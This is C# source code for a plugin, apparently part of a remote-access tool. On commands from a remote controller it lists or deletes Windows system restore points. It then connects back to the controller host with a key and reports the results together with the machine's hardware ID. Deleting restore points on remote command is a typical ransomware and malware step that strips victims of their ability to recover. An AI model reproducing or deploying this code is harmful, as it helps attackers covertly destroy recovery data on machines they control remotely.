using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.CurrentPacket.PacketType)
            {
                case PacketType.UAC_GET_RESTORE_POINT:
                    RestorePointPacket restorePointPacket = new RestorePointPacket(GetRestorePoints.GetAllRestorePoints(), loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, restorePointPacket);
                    break;

                case PacketType.UAC_DELETE_RESTORE_POINT:
                    DeleteRestorePointPacket deleteRestorePoint = new DeleteRestorePointPacket(((DeleteRestorePointPacket)loadingAPI.CurrentPacket).index, DeleteRestorePoint.DeleteARestorePoint(((DeleteRestorePointPacket)loadingAPI.CurrentPacket).index), loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, deleteRestorePoint);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
        private static void ClientSender(Host host, string key, IPacket packet)
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);
            clientHandler.SendPacket(packet);
        }
    }
}
